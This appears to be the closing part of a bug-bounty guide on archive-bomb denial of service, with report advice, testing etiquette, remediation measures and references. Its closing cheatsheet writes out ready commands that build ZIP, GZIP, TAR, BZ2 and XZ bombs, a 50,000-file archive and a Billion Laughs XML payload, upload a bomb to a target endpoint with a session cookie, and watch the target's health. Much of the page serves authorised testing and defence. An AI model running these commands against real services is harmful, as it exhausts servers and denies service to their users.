::steps{level="4"}

#### Title
`Denial of Service via Archive Bomb Upload at [endpoint]`

#### Severity Assessment
| Factor | Details |
| ------ | ------- |
| **Impact** | Server crash / resource exhaustion / service unavailability |
| **CVSS Score** | 6.5–7.5 (DoS without authentication) or 4.0–6.0 (authenticated DoS) |
| **Typical Bounty** | Low to Medium (DoS is generally lower priority than RCE) |
| **Exceptions** | Higher if: AV bypass enables malware upload, WAF bypass enables other attacks, affects shared infrastructure |

#### Key Report Elements
- Compressed size vs expanded size (ratio demonstration)
- Server response time before and after
- Evidence of resource exhaustion (500 errors, timeouts)
- Whether server auto-recovers or requires manual restart
- Impact on other users/services (shared hosting amplifies severity)

#### PoC Best Practices
- **Always start with smallest effective bomb** (10–100 MB expanded)
- **Never use petabyte-scale bombs** against production
- **Monitor and stop** if service becomes unavailable
- **Coordinate with program** before testing DoS
- **Document baseline** response times before and after

::

### Remediation Recommendations

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: Pre-Extraction Size Check
  ---
  Read archive metadata to calculate total uncompressed size **before** extraction. Reject if total exceeds a configured limit. For ZIP: sum all `entry.file_size` values. For TAR: sum all `member.size` values.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Compression Ratio Limit
  ---
  Calculate the ratio of uncompressed-to-compressed size. Reject archives with ratios exceeding a threshold (e.g., 100:1 or 1000:1). Normal data rarely exceeds 20:1 compression.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Stream-Based Size Tracking
  ---
  During extraction, track bytes written in real-time. Abort extraction if total bytes exceed the limit — don't rely solely on pre-extraction metadata (which can be spoofed).
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: File Count & Nesting Limits
  ---
  Limit maximum number of files per archive and maximum nesting depth for recursive archives. Reject archives containing other archives (no `.zip` inside `.zip`).
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: XML Entity Expansion Protection
  ---
  Disable DTD processing and external entity resolution in all XML parsers. Set entity expansion limits. Use `defusedxml` (Python), `FEATURE_SECURE_PROCESSING` (Java), or equivalent for your language.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Resource Isolation
  ---
  Process archives in isolated containers/sandboxes with strict resource limits (CPU time, memory, disk quotas). Use `cgroups`, `ulimit`, or container resource constraints to prevent bomb detonation from affecting other services.
  :::
::

---

## References & Resources

::card-group
  :::card
  ---
  icon: i-lucide-external-link
  title: "A better zip bomb" — David Fifield
  to: https://www.bamsoftware.com/hacks/zipbomb/
  target: _blank
  ---
  Seminal research on non-recursive flat ZIP bombs achieving petabyte expansion from kilobyte files through overlapping local file headers.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: CWE-409 — Improper Handling of Highly Compressed Data
  to: https://cwe.mitre.org/data/definitions/409.html
  target: _blank
  ---
  MITRE CWE entry specifically addressing decompression bomb vulnerabilities in archive processing code.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: OWASP — XML External Entity (XXE) / Billion Laughs
  to: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
  target: _blank
  ---
  OWASP guide covering XML entity expansion attacks including the Billion Laughs bomb and quadratic blowup variants.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: CWE-400 — Uncontrolled Resource Consumption
  to: https://cwe.mitre.org/data/definitions/400.html
  target: _blank
  ---
  MITRE CWE covering resource exhaustion vulnerabilities applicable to archive bomb processing, memory exhaustion, and CPU starvation.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackTricks — File Upload / Decompression Bombs
  to: https://book.hacktricks.wiki/en/pentesting-web/file-upload/
  target: _blank
  ---
  Practical exploitation guide covering ZIP bombs, XML bombs, image bombs, and archive-based denial of service techniques.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: 42.zip — The Original Zip Bomb
  to: https://unforgettable.dk/
  target: _blank
  ---
  The famous 42.zip recursive ZIP bomb — 42 KB compressed, 4.5 petabytes expanded through 5 layers of nested archives.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Python defusedxml Library
  to: https://github.com/tiran/defusedxml
  target: _blank
  ---
  Python library providing safe XML parsing that prevents entity expansion bombs, external entity attacks, and other XML-based exploits.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PayloadsAllTheThings — Zip/Tar Bombs
  to: https://github.com/swisskyrepo/PayloadsAllTheThings
  target: _blank
  ---
  Community payload repository with archive bomb generators, XML bomb templates, and decompression attack payloads.
  :::
::

---

## Quick Reference Cheatsheet

::field-group
  :::field{name="ZIP bomb (100 MB, one-liner)" type="command"}
  `python3 -c "import zipfile; zipfile.ZipFile('bomb.zip','w',zipfile.ZIP_DEFLATED,compresslevel=9).writestr('d.bin',b'\x00'*(100*1024*1024))"`
  :::

  :::field{name="GZIP bomb (1 GB)" type="command"}
  `dd if=/dev/zero bs=1M count=1024 2>/dev/null | gzip -9 > bomb.gz`
  :::

  :::field{name="TAR bomb (500 MB)" type="command"}
  `dd if=/dev/zero of=/tmp/b.bin bs=1M count=500 2>/dev/null && tar czf bomb.tar.gz -C /tmp b.bin && rm /tmp/b.bin`
  :::

  :::field{name="BZ2 bomb (1 GB)" type="command"}
  `dd if=/dev/zero bs=1M count=1024 2>/dev/null | bzip2 -9 > bomb.bz2`
  :::

  :::field{name="XZ bomb (1 GB)" type="command"}
  `dd if=/dev/zero bs=1M count=1024 2>/dev/null | xz -9e > bomb.xz`
  :::

  :::field{name="XML Billion Laughs" type="payload"}
  `<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "lol"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">...<!ENTITY h "&g;&g;...">]><r>&h;</r>`
  :::

  :::field{name="File count bomb (50K files)" type="command"}
  `python3 -c "import zipfile; z=zipfile.ZipFile('fc.zip','w'); [z.writestr(f'f{i}.txt',b'x') for i in range(50000)]; z.close()"`
  :::

  :::field{name="Upload bomb" type="command"}
  `curl -X POST https://target.com/upload -F "file=@bomb.zip;type=application/zip" -H "Cookie: session=TOKEN" --max-time 120`
  :::

  :::field{name="Monitor server health" type="command"}
  `while true; do curl -s -o /dev/null -w "%{http_code} %{time_total}s\n" --max-time 10 https://target.com/; sleep 2; done`
  :::

  :::field{name="Check compression ratio" type="command"}
  `python3 -c "import zipfile,os; z=zipfile.ZipFile('f.zip'); u=sum(e.file_size for e in z.infolist()); c=os.path.getsize('f.zip'); print(f'Ratio: {u/c:.0f}:1')"`
  :::

  :::field{name="Verify ZIP contents" type="command"}
  `unzip -l bomb.zip | tail -3`
  :::

  :::field{name="Safe PoC bomb (10 MB)" type="command"}
  `python3 -c "import zipfile; zipfile.ZipFile('poc.zip','w',zipfile.ZIP_DEFLATED,9).writestr('d.bin',b'\x00'*(10*1024*1024))"`
  :::
::